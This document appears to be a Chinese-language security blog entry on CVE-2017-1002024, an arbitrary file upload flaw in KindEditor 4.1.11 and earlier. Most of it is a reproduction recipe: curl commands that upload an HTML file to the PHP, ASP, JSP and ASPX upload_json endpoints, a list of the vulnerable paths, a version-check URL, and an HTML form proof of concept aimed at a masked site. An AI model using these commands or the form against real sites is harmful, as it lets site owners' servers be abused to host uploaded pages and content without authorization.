---
title: （CVE-2017-1002024）Kindeditor <=4.1.11 上传漏洞
tags:
  - CVE
  - Kindeditor
abbrlink: 29251
date: 2022-05-25 10:01:52
---

# （CVE-2017-1002024）Kindeditor <=4.1.11 上传漏洞

## 一、漏洞简介

漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.11编辑器中

## 二、漏洞影响

Kindeditor \<=4.1.11

## 三、复现过程

```
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file
curl -F"imgFile=@a.html" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file 


```返回值为路径 
```

> json文件地址

```
/asp/upload_json.asp

/asp.net/upload_json.ashx

/jsp/upload_json.jsp

/php/upload_json.php
```

> 上传路径

```
kindeditor/asp/upload_json.asp?dir=file

kindeditor/asp.net/upload_json.ashx?dir=file

kindeditor/jsp/upload_json.jsp?dir=file

kindeditor/php/upload_json.php?dir=file
```

> 查看版本信息

```
http://www.0-sec.org/kindeditor//kindeditor.js
```

![](https://raw.githubusercontent.com/16778738/picture/master/img/20220525102017.png)

![](https://raw.githubusercontent.com/16778738/picture/master/img/20220525102103.png)

## 构造poc

~~~html

<html>
 <head></head>
 <body>
  <form name="form" enctype="multipart/form-data" method="post" action="https://xxxxxxxxxxxx/static/school/tool/kindeditor/php/upload_json.php?dir=file">
   <input type="file" name="imgFile" />
   <input type="submit" value="Submit" />
  </form>
 </body>
</html>

~~~

## 正确的回显

![](https://raw.githubusercontent.com/16778738/picture/master/img/20220525101450.png)

### 错误的回显

![](https://raw.githubusercontent.com/16778738/picture/master/img/20220525101748.png)

> 
